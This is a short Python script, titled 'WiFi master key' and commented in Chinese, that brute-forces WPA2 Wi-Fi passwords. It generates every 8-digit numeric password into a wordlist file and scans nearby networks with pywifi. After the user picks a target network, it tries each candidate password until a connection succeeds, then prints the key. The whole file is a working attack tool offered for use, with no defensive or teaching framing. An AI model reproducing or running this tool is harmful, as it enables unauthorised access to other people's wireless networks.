# !/usr/bin/python3
# -*- coding: utf-8 -*-
# author: makerchen
# time: 2022-10-15


import itertools as it
import time
import pywifi
from pywifi import PyWiFi, const


class breakWiFi(object):

	def __init__(self):
		self.wifi = PyWiFi()

	def writePassword(self, filepath):
		"""
		pwds: itertools.product
		pwd: tuple
		"""
		astring = "1234567890"	#可添加字母和特殊字符
		pwds = it.product(astring, repeat=8)	#8位密码长度
		with open(filepath, 'a', encoding='utf-8') as f:
			for pwd in pwds:	
				f.write(''.join(pwd))
				f.write(''.join('\n'))

		return filepath

	def wifiScan(self):
		"""
		wifiList: list
		wifiNameAndSignal: tuple
		wifi_signal_and_name_list: list(tuple)
		"""
		interface = self.wifi.interfaces()[0]	#使用索引序号0获取第一个无线网卡
		interface.scan()
		print('\n扫描WiFi中，请稍后………………')
		time.sleep(1)
		print('扫描完成！\n' + '\n' + '*' * 50)
		print('\n%s\t%s\t%s' % ('WiFi编号', 'WiFi信号', 'WiFi名称'))
		wifiList = interface.scan_results()	#返回一个列表
		wifiNewList = []
		for w in wifiList:
			wifiNameAndSignal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))	#解决乱码问题并返回元组
			wifiNewList.append(wifiNameAndSignal)

		wifi_signal_and_name_list = sorted(wifiNewList, key=lambda i: i[0], reverse=True)	# 按信号强度倒序
		index = 0

		while index < len(wifi_signal_and_name_list):
			print('%s\t\t\t%s\t\t\t%s' % (index, wifi_signal_and_name_list[index][0], wifi_signal_and_name_list[index][1]))
			index += 1
		print('\n' + '*' * 50)

		return wifi_signal_and_name_list

	def wifiBreak(self, filepath, wifiName):
		with open(filepath, 'r') as f:
			for pwd in f:
				pwd = pwd.strip('\n')
				interface = self.wifi.interfaces()[0]
				interface.disconnect()	#断开所有wifi连接
				#接口状态为4代表连接成功
				while interface.status() == 4:	#当其处于连接状态时，利用循环等待其断开
					pass

				profile = pywifi.Profile()	#创建连接文件（对象）
				profile.ssid = wifiName		#wifi名称
				profile.auth = const.AUTH_ALG_OPEN		#需要认证
				profile.akm.append(const.AKM_TYPE_WPA2PSK)	#wifi默认加密算法
				profile.cipher = const.CIPHER_TYPE_CCMP
				profile.key = pwd
				interface.remove_all_network_profiles()		#删除所有wifi连接文件
				tmp_profile = interface.add_network_profile(profile)	#设置新的wifi连接文件
				
				interface.connect(tmp_profile)	#开始尝试连接

				startTime = time.time()
				while time.time() - startTime < 1.5:
					if interface.status() == 4:
						print('连接成功！密码为：%s' % pwd)
						exit(0)
					else:
						print('正在尝试用密码 %s 暴力破解…………' % pwd)


if __name__ == '__main__':
	print('*' * 20 + 'WiFi万能钥匙' + '*' * 25)
	b = breakWiFi()
	print('\n正在创建密码库，请稍后………………')
	filepath = b.writePassword('pwd.txt')
	if filepath:
		print('创建成功！')
		wifiList = b.wifiScan()
		try:
			wifiIndex = int(input('请选择你要暴力破解的WiFi编号：'))
			if wifiIndex in range(len(wifiList)):
				b.wifiBreak('./' + filepath, wifiList[wifiIndex][1])
			print('*' * 50)
		except Exception as e:
			print(e.args)
